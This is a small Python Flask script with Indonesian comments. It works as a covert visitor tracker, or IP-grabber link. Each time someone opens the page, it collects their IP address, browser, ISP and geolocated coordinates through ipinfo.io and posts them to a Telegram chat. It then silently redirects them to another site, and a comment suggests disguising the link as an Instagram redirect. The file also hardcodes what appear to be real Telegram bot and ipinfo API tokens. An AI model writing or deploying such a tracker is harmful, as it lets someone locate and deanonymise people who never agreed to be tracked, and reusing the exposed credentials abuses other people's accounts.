from flask import Flask, request, render_template, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# Ganti dengan API token dan chat ID kamu
TELEGRAM_TOKEN = "7788714386:AAFUlYVD1pPAxgGwW3tkob7NOOFeT-ErWNo"
CHAT_ID = "7863702154"
IPINFO_TOKEN = "3ba38feeb1e0ae"  # Token dari ipinfo.io

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    requests.post(url, data=payload)

@app.route("/")
def index():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Lokasi dari ipinfo.io
    response = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}")
    data = response.json()

    city = data.get("city", "Unknown")
    region = data.get("region", "Unknown")
    country = data.get("country", "Unknown")
    loc = data.get("loc", "Unknown")
    org = data.get("org", "Unknown")
    hostname = data.get("hostname", "Unknown")

    # Format pesan untuk Telegram
    message = f"""
📍 <b>New Visitor Tracked</b>
🕒 Time: {now}
🌐 IP: <code>{ip}</code>
📍 City: {city}
🗺️ Region: {region}
🏳️ Country: {country}
🏢 ISP: {org}
🧭 Coords: {loc}
🖥️ Device: <code>{user_agent}</code>
🔗 Hostname: {hostname}
"""

    send_to_telegram(message)

    # Redirect ke target asli (contoh Instagram)
    return redirect("https://google.com")

if __name__ == "__main__":
    app.run(debug=True)